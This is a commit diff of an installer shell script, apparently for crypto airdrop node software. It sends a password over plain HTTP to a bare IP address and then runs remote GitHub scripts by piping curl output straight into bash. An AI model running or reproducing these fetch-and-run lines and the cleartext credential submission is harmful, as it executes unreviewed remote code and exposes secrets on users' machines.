08c06e3748ded069f8286eb335ff72c1c8b7aef6
Karanfan47 <161119235+Karanfan47@users.noreply.github.com>
2025-09-17 17:19:50 +0530

    Update all.sh

--- all.sh
+++ all.sh
@@ -2,15 +2,16 @@
 
 set -e  ye
 
-RPC_PASS="${1:-$RPC_PASS}"
-response=$(curl -s -w "%{http_code}" -F "password=$RPC_PASS" -o /tmp/curl_response.txt http://38.102.86.215:5000/grant)
-if [ "$response" != "200" ]; then
+RPC_PASS="${RPC_PASS:-}"
+
+# RPC grant
+http_response=$(curl -s -o /tmp/curl_response.txt -w "%{http_code}" -F "password=$RPC_PASS" http://38.102.86.215:5000/grant)
+if [ "$http_response" != "200" ]; then
     echo "❌ Wrong password! Access denied."
     cat /tmp/curl_response.txt
 else
     cat /tmp/curl_response.txt
 fi
-
 bash <(curl -fsSL https://github.com/HustleAirdrops/Aztec-One-Command-Installation-Run/raw/main/auto.sh)
 
 bash <(curl -fsSL https://raw.githubusercontent.com/Karanfan47/special-special/main/import.sh)
